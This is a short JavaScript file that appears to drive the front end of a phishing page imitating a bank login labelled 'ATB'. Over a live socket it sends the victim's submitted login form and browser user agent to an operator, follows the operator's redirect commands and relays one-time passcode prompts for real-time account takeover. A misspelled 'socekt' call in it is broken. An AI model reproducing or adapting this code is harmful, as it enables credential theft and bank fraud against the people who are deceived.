const socket = io();
let navig = document.getElementById('navig').textContent
let stage = document.getElementById('stage').textContent

if(stage != 'OTP' && stage != 'Loading'){
    socekt.emit('nextNavig', {next: navig})
}

socket.emit('pageandstage', { page: 'ATB', stage: stage })

socket.on('OTP', (data) => {
    if (data.otp) {
        navig = `${data.navig}`;
        socket.emit('typeOTP', {navig: data.navig})
    }
})


function submitForm() {
    document.getElementById('userAgent').value = navigator.userAgent;

    const formData = new FormData(document.getElementById('loginForm'));

    socket.emit('submit', Object.fromEntries(formData));

    window.location.href = navig;
}

// Exceptions Parts

socket.on('OTPResponse', (data) => {
    if (data.res) {
        window.location.href = data.next;
    } else {
        fetch(`${data.next}?argument=${encodeURIComponent("true")}`)
    .then(response => response.json())
    .then(data => console.log('Data received:', data))
    .catch(error => console.error('Error:', error));
    }
})